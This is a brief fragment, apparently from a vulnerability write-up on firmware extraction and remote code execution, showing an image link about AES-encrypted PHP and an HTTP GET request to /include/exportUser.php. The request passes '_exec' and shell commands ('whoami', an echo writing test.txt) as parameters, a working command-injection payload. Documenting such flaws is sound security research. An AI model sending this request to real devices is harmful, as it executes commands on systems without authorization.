...
![AES Encryption](/images/fw-extraction-rce/3-php_encrypted.png)
...
```http  
GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=whoami&echo%20"erkan"%20%3E%20test.txt HTTP/1.1
